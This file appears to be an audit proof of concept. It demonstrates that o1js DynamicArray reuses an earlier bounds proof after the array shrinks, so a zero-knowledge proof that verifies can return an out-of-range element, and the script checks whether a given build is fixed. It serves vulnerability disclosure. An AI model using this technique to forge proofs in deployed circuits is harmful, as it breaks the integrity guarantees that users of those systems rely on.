/**
 * End-to-end proof of concept for Finding 1 (missing bounds constraint).
 *
 *   npm install o1js@3.0.0
 *   node --stack-size=65500 proof-of-concept.mjs      # ~1 minute, mostly compile
 *
 * The circuit below reads, to its author, as:
 *
 *     "arr has exactly 2 elements, i is a valid index into arr,
 *      and the public output is arr[i]."
 *
 * Both `get` calls are documented to prove that the index is in the array. The
 * second one does not, because `assertIndexInRange` memoised the first proof
 * against a length that no longer holds. A verifying proof therefore returns
 * element #4 of an array it simultaneously proves has 2 elements.
 */
import { DynamicArray, Field, ZkProgram } from 'o1js';

class Arr extends DynamicArray(Field, { capacity: 8 }) {}

const OutOfBounds = ZkProgram({
  name: 'dynamic-array-out-of-bounds',
  publicOutput: Field,
  methods: {
    readPastLength: {
      privateInputs: [Arr, Field],
      async method(arr, i) {
        arr.get(i); // bounds-checked: proves i < arr.length
        arr.decreaseLengthBy(Field(3)); // arr.length is now 2
        let v = arr.get(i); // author expects i < 2 to be enforced here
        arr.length.assertEquals(Field(2));
        return { publicOutput: v };
      },
    },
  },
});

console.log('compiling...');
const t0 = Date.now();
await OutOfBounds.compile();
console.log(`compiled in ${((Date.now() - t0) / 1000).toFixed(1)}s`);

const arr = Arr.from([10, 20, 30, 40, 50].map(Field));

let proof;
try {
  ({ proof } = await OutOfBounds.readPastLength(arr, Field(4))); // 4 is not in [0, 2)
} catch (error) {
  console.log('proving failed -- the bounds check fired, so this build is fixed:');
  console.log(`  ${String(error.message).split('\n')[0]}`);
  process.exit(0);
}

const verified = await OutOfBounds.verify(proof);
console.log(`proof verifies : ${verified}`);
console.log(`public output  : ${proof.publicOutput}`);
console.log('the same proof asserts the array has length 2, so the only valid');
console.log('indices are {0, 1} -- yet the output is the element at index 4.');
